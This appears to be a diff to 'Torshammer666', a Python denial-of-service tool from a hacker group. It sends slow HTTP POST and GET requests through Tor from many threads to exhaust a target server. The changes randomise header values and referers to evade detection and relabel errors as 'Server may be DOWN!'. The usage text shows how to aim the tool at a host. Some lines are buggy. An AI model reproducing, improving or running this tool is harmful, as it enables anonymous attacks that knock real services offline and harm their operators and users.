@@ -2,17 +2,7 @@
 
 # Torshammer666-(edit) with New  random keep alive values added GET request, More randomizers and other tweaks
 # An0nsec666 An0nsecHackers
-import os
-import re
-import time
-import sys
-import random
-import math
-import getopt
-import socks
-import string
-import terminal
-from threading import Thread
+import os, re, time, sys, random, math, getopt, socks, string, terminal; from threading import Thread
 
 global stop_now
 global term
@@ -127,17 +117,15 @@ useragents = [
     "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
     "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0",
 ]
+
 # builds random ascii string
 def buildblock(self, size):
     out_str = ''
-
     _LOWERCASE = range(97, 122)
     _UPPERCASE = range(65, 90)
     _NUMERIC = range(48, 57)
-
     validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
     return (out_str)
-
 
 class httpPost(Thread):
     def __init__(self, host, port, tor):
@@ -150,11 +138,13 @@ class httpPost(Thread):
 
     # generates a referer array
     def referer_list(self):
-
         global headers_referers
         headers_referers.append('http://www.google.com/?q=')
         headers_referers.append('http://www.usatoday.com/search/results?q=')
         headers_referers.append('http://engadget.search.aol.com/search?q=')
+        headers_referers.append('http://www.google.co.uk/?q=')
+        headers_referers.append('http://www.youtube.com/?q=')
+        headers_referers.append('http://www.bing.com/')
         headers_referers.append('http://' + host + '/')
         return (headers_referers)
 
@@ -165,31 +155,29 @@ class httpPost(Thread):
                         "User-Agent: %s\r\n"
                         "Cache-Control: no-cache\r\n"
                         "Connection: keep-alive\r\n"
-                        "Keep-Alive: 300\r\n"
-                        "Content-Length: 10000\r\n"
+                        "Keep-Alive: %s\r\n"
+                        "Content-Length: %s\r\n"
                         "Content-Type: application/x-www-form-urlencoded,multipart/form-data\r\n\r\n" %
-                        (self.host, random.choice(useragents)))
-
-    def _send_http_get(self, pause=random.randrange(5, 10)):
+                        (self.host, random.choice(useragents), random.randint(5,300), random.randint(10000,1000000)))
+    def _send_http_get(self, pause=random.randint(5, 10)):
         global stop_now
         self.socks.send("GET / HTTP/1.1\r\n"
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
                         "Connection: keep-alive\r\n"
-                        "Keep-Alive: 300\r\n"
-                        "Content-Length: 42\r\n"
+                        "Keep-Alive: %s\r\n"
+                        "Content-Length: %s\r\n"
                         "Cache-Control: no-cache\r\n"
-                        "Window-Size: 0\r\n\r\n" %
-                        (self.host, random.choice(useragents)))
+                        "Window-Size: 0\r\n" %
+                        (self.host, random.choice(useragents), random.randint(5,300), random.randint(10000,1000000)))
         for i in range(0, 9999):
             if stop_now:
                 self.running = False
                 break
-
         data = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
                 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0''!',
-                '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '"', ';', 'NULL', 'null''\x00', '0xFFFFFFFF']
+                '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '"', ';', 'NULL', 'null', '\x00', '0xFFFFFFFF']
         p = random.choice(data)
         counts = [p, p * 2, p * 3, p * 4, p * 5, p * 6]
         count = random.choice(counts)  # randomly sends 1-6 random data strings at a time ;)
@@ -205,20 +193,20 @@ class httpPost(Thread):
             while self.running:
                 try:
                     if self.tor:
-                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150)
                     self.socks.connect((self.host, self.port))
                     print term.BOL + term.UP + term.CLEAR_EOL + "T0r b0ts c0nnected" + term.NORMAL
                     break
                 except Exception, e:
                     if e.args[0] == 106 or e.args[0] == 60:
                         break
-                    print term.BOL + term.UP + term.CLEAR_EOL + "Error connecting" + term.NORMAL
+                    print term.BOL + term.UP + term.CLEAR_EOL + "Server may be DOWN!" + term.NORMAL
                     time.sleep = (random.uniform(1, 3))
                     continue
 
             while self.running:
                 try:
-                    random.choice[(self._send_http_post(), self._send_http_get())]
+                    random.choice[(self._send_http_post(), self._send_http_get(), self._send_http_post() + self._send_http_get())]
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
                         print term.BOL + term.UP + term.CLEAR_EOL + "Broken threads, restarting..." + term.NORMAL
@@ -226,7 +214,6 @@ class httpPost(Thread):
                         break
                     time.sleep(0.1)
                     pass
-
 
 def usage():
     print "./torshammer666.py -t <target> [-r <threads> -p <port> -T -h]"
@@ -237,14 +224,12 @@ def usage():
     print " -h|--help Shows this help\n"
     print "Eg. ./torshammer666.py -t 192.168.1.100 -r 256\n"
 
-
 def main(argv):
     try:
         opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
     except getopt.GetoptError:
         usage()
         sys.exit(-1)
-
     global stop_now
 
     target = ''
@@ -264,7 +249,6 @@ def main(argv):
             threads = int(a)
         elif o in ("-p", "--port"):
             port = int(a)
-
     if target == '' or int(threads) <= 0:
         usage()
         sys.exit(-1)
@@ -280,7 +264,6 @@ def main(argv):
         t = httpPost(target, port, tor)
         rthreads.append(t)
         t.start()
-
     while len(rthreads) > 0:
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
@@ -289,7 +272,6 @@ def main(argv):
             for t in rthreads:
                 stop_now = True
                 t.running = False
-
 
 if __name__ == "__main__":
     print "\n/*"
@@ -311,5 +293,4 @@ if __name__ == "__main__":
     print " */\n"
 
     main(sys.argv[1:])
-
     print "Bye...\n"
